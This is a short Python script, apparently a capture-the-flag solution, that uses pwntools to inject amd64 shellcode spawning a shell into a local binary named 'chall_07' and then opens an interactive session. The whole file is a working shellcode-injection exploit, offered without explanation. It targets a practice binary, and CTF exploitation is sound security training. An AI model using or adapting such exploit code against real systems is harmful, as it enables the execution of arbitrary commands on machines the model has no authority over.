# coding: utf-8
from pwn import *
elf=ELF("./chall_07")
p=process("./chall_07")
context.arch="amd64"
payload = asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
